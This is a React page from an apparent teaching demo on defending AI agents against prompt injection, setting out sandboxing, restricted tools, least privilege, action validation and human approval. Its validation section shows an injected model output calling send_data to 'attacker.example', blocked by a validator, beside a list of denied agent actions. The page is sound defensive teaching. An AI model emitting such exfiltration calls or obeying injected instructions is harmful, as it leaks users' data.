"use client";

import { useState } from "react";
import Link from "next/link";

type Mitigation = {
  id: string;
  number: string;
  title: string;
  short: string;
  description: string;
  example: string;
  effect: string;
};

const mitigations: Mitigation[] = [
  {
    id: "sandboxing",
    number: "01",
    title: "Sandboxing",
    short: "Contain the agent",
    description:
      "Run the agent in an isolated environment so that even a successful injection has limited access to the host system.",
    example:
      "The agent cannot access the host filesystem, operating system processes, credentials, or arbitrary network resources.",
    effect:
      "Limits the blast radius when an agent is compromised."
  },
  {
    id: "tools",
    number: "02",
    title: "Restricted tools",
    short: "Limit available actions",
    description:
      "Only expose the tools that the agent actually needs for its task.",
    example:
      "A document summarisation agent gets read_document and create_summary, but not send_email or delete_file.",
    effect:
      "An injected instruction cannot invoke a tool that does not exist in the agent's toolset."
  },
  {
    id: "privilege",
    number: "03",
    title: "Least privilege",
    short: "Minimise permissions",
    description:
      "Give each tool and agent the minimum permissions necessary to perform its intended task.",
    example:
      "A database tool may have SELECT permission but no INSERT, UPDATE, or DELETE permissions.",
    effect:
      "Reduces what an attacker can do even when a legitimate tool is manipulated."
  },
  {
    id: "validation",
    number: "04",
    title: "Validation",
    short: "Check proposed actions",
    description:
      "Validate model-generated actions outside the model before executing them.",
    example:
      "Reject an external destination that is not on an allow-list or an action that does not match the user's original task.",
    effect:
      "Creates an application-controlled security boundary around model output."
  },
  {
    id: "confirmation",
    number: "05",
    title: "Human confirmation",
    short: "Require approval",
    description:
      "Require explicit human approval before high-impact or irreversible actions.",
    example:
      "The agent can prepare an email, but a person must approve it before it is actually sent.",
    effect:
      "Prevents the model from independently performing sensitive actions."
  }
];

export default function MitigationsPage() {
  const [selected, setSelected] = useState("tools");

  const active = mitigations.find(
    (item) => item.id === selected
  )!;

  return (
    <div className="page">
      <section className="page-header">
        <div className="eyebrow">DEMO 03</div>

        <h1>Controlling prompt injection</h1>

        <p>
          Prompt injection cannot be reliably solved by simply
          writing a stronger prompt. Instead, applications can
          combine multiple security controls to limit what an
          manipulated agent can do.
        </p>
      </section>

      {/* Main security model */}
      <section className="mitigation-architecture">
        <div className="architecture-label">
          DEFENCE IN DEPTH
        </div>

        <div className="attack-source">
          <div className="attack-icon">!</div>

          <div>
            <strong>Prompt injection</strong>

            <span>
              Malicious instructions enter the model context
            </span>
          </div>
        </div>

        <div className="security-arrow">
          ↓
        </div>

        <div className="security-layer layer-one">
          <span>01</span>
          <strong>Sandbox</strong>
          <small>Contain the agent</small>
        </div>

        <div className="security-layer layer-two">
          <span>02</span>
          <strong>Restricted tools</strong>
          <small>Limit available actions</small>
        </div>

        <div className="security-layer layer-three">
          <span>03</span>
          <strong>Least privilege</strong>
          <small>Limit permissions</small>
        </div>

        <div className="security-layer layer-four">
          <span>04</span>
          <strong>Validation</strong>
          <small>Check actions</small>
        </div>

        <div className="security-layer layer-five">
          <span>05</span>
          <strong>Confirmation</strong>
          <small>Human approval</small>
        </div>

        <div className="security-arrow">
          ↓
        </div>

        <div className="protected-result">
          <div className="protected-icon">✓</div>

          <div>
            <strong>Sensitive action controlled</strong>

            <span>
              The agent may still be manipulated, but the
              available damage is constrained.
            </span>
          </div>
        </div>
      </section>

      {/* Interactive controls */}
      <section className="mitigation-section">
        <div className="section-heading">
          <span>CONTROLS</span>

          <h2>
            Five layers of protection
          </h2>
        </div>

        <div className="mitigation-grid">
          <div className="mitigation-list">
            {mitigations.map((mitigation) => (
              <button
                key={mitigation.id}
                onClick={() =>
                  setSelected(mitigation.id)
                }
                className={
                  selected === mitigation.id
                    ? "mitigation-option selected"
                    : "mitigation-option"
                }
              >
                <span className="mitigation-number">
                  {mitigation.number}
                </span>

                <span className="mitigation-text">
                  <strong>{mitigation.title}</strong>

                  <small>{mitigation.short}</small>
                </span>

                <span className="mitigation-arrow">
                  →
                </span>
              </button>
            ))}
          </div>

          <div className="mitigation-detail">
            <div className="detail-number">
              {active.number}
            </div>

            <h3>{active.title}</h3>

            <p className="detail-description">
              {active.description}
            </p>

            <div className="detail-block">
              <div className="detail-label">
                EXAMPLE
              </div>

              <p>{active.example}</p>
            </div>

            <div className="detail-block effect">
              <div className="detail-label">
                SECURITY EFFECT
              </div>

              <p>{active.effect}</p>
            </div>
          </div>
        </div>
      </section>

      {/* Agent permissions */}
      <section className="permission-section">
        <div className="section-heading">
          <span>LEAST PRIVILEGE</span>

          <h2>
            What the agent can actually do
          </h2>
        </div>

        <div className="permission-grid">
          <div className="permission-card allowed">
            <div className="permission-header">
              <span className="permission-symbol">
                ✓
              </span>

              <strong>Allowed</strong>
            </div>

            <ul>
              <li>Read the supplied document</li>
              <li>Create a summary</li>
              <li>Create a draft support ticket</li>
            </ul>
          </div>

          <div className="permission-card denied">
            <div className="permission-header">
              <span className="permission-symbol">
                ×
              </span>

              <strong>Not allowed</strong>
            </div>

            <ul>
              <li>Send arbitrary external requests</li>
              <li>Access system credentials</li>
              <li>Delete customer data</li>
              <li>Modify account permissions</li>
            </ul>
          </div>
        </div>
      </section>

      {/* Action validation */}
      <section className="validation-demo">
        <div className="section-heading">
          <span>ACTION VALIDATION</span>

          <h2>
            Never execute model output blindly
          </h2>
        </div>

        <div className="validation-flow">
          <div className="validation-box model-output">
            <span>MODEL OUTPUT</span>

            <code>
              send_data(
              <br />
              &nbsp;&nbsp;&quot;https://attacker.example&quot;
              <br />
              )
            </code>
          </div>

          <div className="validation-arrow">
            →
          </div>

          <div className="validation-box validator">
            <span>APPLICATION VALIDATOR</span>

            <div className="check">
              <span>×</span>
              Destination not allowed
            </div>

            <div className="check">
              <span>×</span>
              Sensitive data involved
            </div>

            <div className="check">
              <span>×</span>
              No user confirmation
            </div>
          </div>

          <div className="validation-arrow">
            →
          </div>

          <div className="validation-box blocked">
            <span>RESULT</span>

            <strong>BLOCKED</strong>

            <small>
              Tool execution never occurs.
            </small>
          </div>
        </div>
      </section>

      {/* Final message */}
      <section className="takeaway">
        <div>
          <div className="eyebrow">
            IMPORTANT
          </div>

          <h2>
            The objective is not perfect prevention.
          </h2>
        </div>

        <p>
          Prompt injection can remain possible even when an
          application has strong controls. The security goal is
          to prevent an injected instruction from becoming an
          unrestricted, high-impact action.
        </p>
      </section>

      <div className="mitigation-navigation">
        <Link href="/direct">
          ← Direct injection
        </Link>

        <Link href="/indirect">
          Indirect injection →
        </Link>
      </div>
    </div>
  );
}